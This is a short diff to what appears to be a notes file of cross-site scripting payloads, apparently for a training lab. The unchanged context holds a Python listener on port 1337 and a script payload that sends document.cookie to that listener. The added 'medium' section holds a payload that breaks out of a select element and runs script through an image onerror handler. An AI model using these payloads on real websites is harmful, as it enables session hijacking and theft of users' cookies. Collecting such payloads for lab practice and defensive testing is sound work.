@@ -12,3 +12,8 @@ python -m http.server 1337
 webup
 <script>windows.location='http://127.0.0.1:1337?cookie='+document.cookie</script>
 ```
+
+### medium
+```
+</select><image src/onerror=alert(1)>
+```
